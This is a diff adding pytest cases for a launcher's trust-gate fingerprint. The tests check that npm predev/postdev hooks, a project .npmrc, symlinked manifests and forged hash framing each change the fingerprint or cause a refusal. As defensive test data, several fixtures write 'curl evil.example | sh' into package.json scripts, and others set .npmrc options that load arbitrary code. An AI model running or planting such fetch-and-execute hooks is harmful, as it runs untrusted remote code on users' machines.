@@ -482,12 +482,12 @@ def test_an_oversized_manifest_does_not_fingerprint_as_its_prefix(
         ("env", "sh", "start.sh"),
         ("npm", "start"),
         # Three elements beginning `npm`, but the subcommand is not `run`.
-        # `_npm_script` reads argv[2] as a script name, so without the
+        # `_npm_material` reads argv[2] as a script name, so without the
         # subcommand check this would be vouched for by the hash of an
         # unrelated `scripts` entry while doing something else entirely.
         ("npm", "config", "list"),
         # `npm run <script>` is the supported shape; another package manager
-        # spelling it the same way is not, because `_npm_script` reads the
+        # spelling it the same way is not, because `_npm_material` reads the
         # script out of `package.json` under npm's rules alone.
         ("yarn", "run", "dev"),
     ],
@@ -1882,6 +1882,99 @@ def test_npm_run_refuses_a_package_json_others_can_rewrite(
         supervisor.start(project, name="demo", argv=argv, port=None)
 
 
+@pytest.mark.parametrize("hook", ["predev", "postdev"])
+def test_adding_an_npm_pre_or_post_script_re_arms_the_trust_gate(
+    project: Path, hook: str
+) -> None:
+    """LWSM-1363. `npm run dev` also runs `predev` and `postdev`, and the
+    fingerprint covered `scripts.dev` alone — so a `git pull` adding either ran
+    new code on the next Start with no confirmation.
+    """
+    package = project / "package.json"
+    argv = ("npm", "run", "dev")
+    package.write_text(json.dumps({"scripts": {"dev": "vite"}}), encoding="utf-8")
+    before = launcher_fingerprint(project, argv)
+
+    package.write_text(
+        json.dumps({"scripts": {"dev": "vite", hook: "curl evil.example | sh"}}),
+        encoding="utf-8",
+    )
+
+    assert launcher_fingerprint(project, argv) != before
+
+
+def test_a_project_npmrc_re_arms_the_trust_gate(project: Path) -> None:
+    """LWSM-1363. npm reads the project's `.npmrc`, where `script-shell` and
+    `node-options` change what `npm run dev` executes without touching
+    `package.json`.
+    """
+    (project / "package.json").write_text(
+        json.dumps({"scripts": {"dev": "vite"}}), encoding="utf-8"
+    )
+    argv = ("npm", "run", "dev")
+    before = launcher_fingerprint(project, argv)
+
+    (project / ".npmrc").write_text("script-shell=./x.sh\n", encoding="utf-8")
+    added = launcher_fingerprint(project, argv)
+    (project / ".npmrc").write_text("node-options=--require ./e.js\n", encoding="utf-8")
+
+    assert added != before
+    assert launcher_fingerprint(project, argv) != added
+
+
+def test_a_symlinked_package_json_still_fingerprints_its_scripts(
+    project: Path,
+) -> None:
+    """LWSM-1364. `_launcher_bytes` opens with `O_NOFOLLOW`, so a `package.json`
+    that is a symlink read as missing and fingerprinted as the constant
+    `nofile` marker: confirmed once, its target's scripts then changed freely.
+    """
+    (project / "sub").mkdir()
+    target = project / "sub" / "package.json"
+    (project / "package.json").symlink_to("sub/package.json")
+    argv = ("npm", "run", "dev")
+    target.write_text(json.dumps({"scripts": {"dev": "vite"}}), encoding="utf-8")
+    before = launcher_fingerprint(project, argv)
+
+    target.write_text(
+        json.dumps({"scripts": {"dev": "curl evil.example | sh"}}), encoding="utf-8"
+    )
+
+    assert launcher_fingerprint(project, argv) != before
+
+
+def test_npm_run_refuses_a_script_it_cannot_read(supervisor, project: Path) -> None:
+    """LWSM-1364. An unreadable script fingerprinted as `nofile`, a state the
+    user could confirm and that then stayed confirmed whatever the manifest
+    later said. Unreadable is refused, never offered.
+    """
+    (project / "package.json").write_text(
+        json.dumps({"scripts": {"start": "vite"}}), encoding="utf-8"
+    )
+    argv = ["npm", "run", "dev"]
+    supervisor.trust.confirm(project, launcher_fingerprint(project, tuple(argv)))
+
+    with pytest.raises(LauncherRefused, match="dev"):
+        supervisor.start(project, name="demo", argv=argv, port=None)
+
+
+def test_a_lone_surrogate_in_an_npm_script_is_refused_not_raised(
+    supervisor, project: Path
+) -> None:
+    """LWSM-1367. `"\\ud800"` is valid JSON and `json.loads` returns a lone
+    surrogate, which `surrogateescape` cannot encode. The `UnicodeEncodeError`
+    escaped `start()`, which the controller does not catch, so Start did
+    nothing and said nothing.
+    """
+    (project / "package.json").write_text(
+        '{"scripts": {"dev": "\\ud800"}}', encoding="utf-8"
+    )
+    argv = ["npm", "run", "dev"]
+
+    with pytest.raises((LauncherUntrusted, LauncherRefused)):
+        supervisor.start(project, name="demo", argv=argv, port=None)
+
+
 def test_rewriting_an_interpreter_script_re_arms_the_trust_gate(project: Path) -> None:
     """The same property for `python3 serve.py`, where the content is the script
     rather than a string inside a manifest.
@@ -2730,3 +2823,44 @@ def test_rotating_by_path_leaves_a_missing_log_alone(supervisor, project) -> Non
     """A row that never had a log here must cost one failed open, not a file."""
     assert supervisor.rotate_log_at(project, "demo") is False
     assert not supervisor.log_path_for(project, "demo").exists()
+
+
+def test_npm_material_cannot_be_forged_by_moving_bytes_between_its_parts(
+    tmp_path: Path,
+) -> None:
+    """LWSM-1363. The parts are joined by marker text that a JSON string and a
+    `.npmrc` can both contain. Unframed, a `postdev` ending in the `.npmrc`
+    marker plus no `.npmrc`, and a shorter `postdev` plus an `.npmrc` ending
+    in the no-`.npmrc` marker, hashed identically — so a confirmation of one
+    covered the other.
+    """
+    argv = ("npm", "run", "dev")
+    first = tmp_path / "first"
+    second = tmp_path / "second"
+    for directory, post in ((first, "c\0npmrc\0X"), (second, "c")):
+        directory.mkdir()
+        (directory / "package.json").write_text(
+            json.dumps({"scripts": {"dev": "vite", "postdev": post}}),
+            encoding="utf-8",
+        )
+    (second / ".npmrc").write_bytes(b"X\0no-npmrc\0")
+
+    assert launcher_fingerprint(first, argv) != launcher_fingerprint(second, argv)
+
+
+def test_npm_run_refuses_an_npmrc_others_can_rewrite(supervisor, project: Path) -> None:
+    """LWSM-1363. `.npmrc` changes what `npm run` executes, so it meets the
+    refusals `package.json` does in that role: a file another account can
+    rewrite is refused before the trust gate, not after it.
+    """
+    (project / "package.json").write_text(
+        json.dumps({"scripts": {"dev": "sleep 30"}}), encoding="utf-8"
+    )
+    npmrc = project / ".npmrc"
+    npmrc.write_text("fund=false\n", encoding="utf-8")
+    npmrc.chmod(0o666)
+    argv = ["npm", "run", "dev"]
+    supervisor.trust.confirm(project, launcher_fingerprint(project, tuple(argv)))
+
+    with pytest.raises(LauncherRefused, match="group- or other-writable"):
+        supervisor.start(project, name="demo", argv=argv, port=None)
